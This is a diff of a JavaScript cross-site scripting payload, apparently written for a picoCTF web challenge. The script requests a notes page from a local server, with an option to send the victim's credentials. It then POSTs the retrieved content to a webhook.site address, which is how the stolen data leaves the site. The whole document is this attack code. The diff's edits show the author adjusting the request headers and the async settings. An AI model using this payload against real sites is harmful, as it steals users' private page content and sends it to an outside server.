@@ -1,11 +1,13 @@
 <script>
 var req = new XMLHttpRequest();
 
-req.open('GET', 'http://0.0.0.0:8080', false);
-req.withCredentials = true
+req.open('GET', 'http://0.0.0.0:8080/notes', true);
+req.setRequestHeader('Access-Control-Allow-Origin', '*');
+req.setRequestHeader('Origin', '0.0.0.0:8080');
+// req.withCredentials = true
 // req.open('GET', 'http://saturn.picoctf.net:62774', false);
-req.send();
-var a = req;
+req.send(null);
+// var a = req;
 if(req.status == 200) {
   a = req.responseText;
 }
@@ -14,8 +16,10 @@ else {
   alert(req.statusText)
 }
 // var a = '1234'
+console.log(a)
 var req_webhook = new XMLHttpRequest();
-req_webhook.open('POST', `https://webhook.site/be1f8c0e-24d7-4dcd-a109-098da8ae468f`, false);
+req_webhook.open('POST', `https://webhook.site/be1f8c0e-24d7-4dcd-a109-098da8ae468f`, true);
+// req_webhook.setRequestHeader('Access-Control-Allow-Origin', '*');
 req_webhook.send(a);
 
 // fetchNotes()
